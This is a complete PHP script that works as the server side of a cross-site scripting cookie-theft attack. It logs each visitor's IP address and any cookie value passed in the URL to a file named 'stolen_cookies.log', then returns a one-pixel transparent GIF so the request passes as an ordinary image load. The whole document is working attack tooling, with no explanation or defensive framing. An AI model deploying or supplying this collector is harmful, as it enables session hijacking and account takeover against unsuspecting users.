<?php
$log_file = 'stolen_cookies.log';
$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : 'No cookie received';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');
$log_entry = "[$timestamp] IP: $ip | Cookie: $cookie\n";

file_put_contents($log_file, $log_entry, FILE_APPEND);

header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
